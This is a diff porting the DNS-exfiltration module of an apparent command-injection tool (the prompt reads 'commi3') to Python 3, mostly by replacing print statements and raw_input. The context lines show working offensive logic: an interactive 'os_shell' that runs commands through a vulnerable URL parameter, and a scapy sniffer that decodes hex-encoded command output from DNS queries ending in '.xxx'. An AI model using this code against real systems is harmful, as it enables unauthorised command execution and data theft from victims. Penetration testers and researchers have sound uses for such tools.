@@ -13,7 +13,7 @@ import sys
 import time
 import signal
 import socket
-import urllib
+import urllib.request, urllib.parse, urllib.error
 from urllib.request import urlopen
 import threading
 
@@ -70,7 +70,7 @@ exfiltrate data using a user-defined DNS server [1].
 def querysniff(pkt):
   if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
     if ".xxx" in pkt.getlayer(DNS).qd.qname:
-      print (pkt.getlayer(DNS).qd.qname.split(".xxx")[0].decode("hex"))
+      print((pkt.getlayer(DNS).qd.qname.split(".xxx")[0].decode("hex")))
 
 def signal_handler(signal, frame):
   os._exit(0)
@@ -78,7 +78,7 @@ def signal_handler(signal, frame):
 def snif(dns_server):
   success_msg = "Started the sniffer between you and the DNS server '"
   success_msg += Style.BRIGHT + Fore.YELLOW + dns_server + Style.RESET_ALL + "'."
-  print (settings.print_success_msg(success_msg))
+  print((settings.print_success_msg(success_msg)))
   while True:
     sniff(filter="port 53", prn=querysniff, store = 0)
  
@@ -118,7 +118,7 @@ def input_cmd(dns_server, http_request_method, url, vuln_parameter, technique):
     warn_msg = "The " + err_msg + " options are not supported "
     warn_msg += "by this module because of the structure of the exfiltrated data. "
     warn_msg += "Please try using any UNIX-like commands manually."
-    print (settings.print_warning_msg(warn_msg))
+    print((settings.print_warning_msg(warn_msg)))
   
   # Pseudo-Terminal shell
   go_back = False
@@ -135,7 +135,7 @@ def input_cmd(dns_server, http_request_method, url, vuln_parameter, technique):
     if len(gotshell) == 0:
        gotshell= "y"
     if gotshell in settings.CHOICE_YES:
-      print ("\nPseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)")
+      print(("\nPseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"))
       if readline_error:
         checks.no_readline_module()
       while True:
@@ -149,7 +149,7 @@ def input_cmd(dns_server, http_request_method, url, vuln_parameter, technique):
             # Unix tab compliter
             else:
               readline.parse_and_bind("tab: complete")
-          cmd = raw_input("""commi3(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
+          cmd = input("""commi3(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
           cmd = checks.escaped_cmd(cmd)
           if cmd.lower() in settings.SHELL_OPTIONS:
             if cmd.lower() == "quit" or cmd.lower() == "back":       
@@ -159,10 +159,10 @@ def input_cmd(dns_server, http_request_method, url, vuln_parameter, technique):
               menu.os_shell_options()
             elif cmd.lower() == "os_shell": 
               warn_msg = "You are already into the '" + cmd.lower() + "' mode."
-              print (settings.print_warning_msg(warn_msg)+ "\n")
+              print((settings.print_warning_msg(warn_msg)+ "\n"))
             elif cmd.lower() == "reverse_tcp":
               warn_msg = "This option is not supported by this module."
-              print (settings.print_warning_msg(warn_msg)+ "\n")
+              print((settings.print_warning_msg(warn_msg)+ "\n"))
           else:
             # Command execution results.
             cmd_exec(dns_server, http_request_method, cmd, url, vuln_parameter)
@@ -187,7 +187,7 @@ def input_cmd(dns_server, http_request_method, url, vuln_parameter, technique):
 
     else:
       err_msg = "'" + gotshell + "' is not a valid answer."
-      print (settings.print_error_msg(err_msg))
+      print((settings.print_error_msg(err_msg)))
       pass
 
 
@@ -214,7 +214,7 @@ def dns_exfiltration_handler(url, http_request_method):
   # You need to have root privileges to run this script
   if os.geteuid() != 0:
     err_msg = "You need to have root privileges to run this option."
-    print ("\n" + settings.print_critical_msg(err_msg))
+    print(("\n" + settings.print_critical_msg(err_msg)))
     os._exit(0)
 
   if http_request_method == "GET":
@@ -240,7 +240,7 @@ def dns_exfiltration_handler(url, http_request_method):
         response = False  
       elif settings.IGNORE_ERR_MSG == False:
         err = str(err_msg) + "."
-        print ("\n" + settings.print_critical_msg(err))
+        print(("\n" + settings.print_critical_msg(err)))
         continue_tests = checks.continue_tests(err_msg)
         if continue_tests == True:
           settings.IGNORE_ERR_MSG = True
@@ -256,7 +256,7 @@ def dns_exfiltration_handler(url, http_request_method):
         response = False  
       elif settings.IGNORE_ERR_MSG == False:
         err = str(err_msg) + "."
-        print ("\n" + settings.print_critical_msg(err))
+        print(("\n" + settings.print_critical_msg(err)))
         continue_tests = checks.continue_tests(err_msg)
         if continue_tests == True:
           settings.IGNORE_ERR_MSG = True
@@ -271,7 +271,7 @@ def dns_exfiltration_handler(url, http_request_method):
         response = False  
       elif settings.IGNORE_ERR_MSG == False:
         err = str(err_msg) + "."
-        print ("\n" + settings.print_critical_msg(err))
+        print(("\n" + settings.print_critical_msg(err)))
         continue_tests = checks.continue_tests(err_msg)
         if continue_tests == True:
           settings.IGNORE_ERR_MSG = True
@@ -281,7 +281,7 @@ def dns_exfiltration_handler(url, http_request_method):
   if settings.TARGET_OS == "win":
     err_msg = "This module's payloads are not suppoted by "
     err_msg += "the identified target operating system."
-    print (settings.print_critical_msg(err_msg) + "\n")
+    print((settings.print_critical_msg(err_msg) + "\n"))
     os._exit(0)
 
   else:
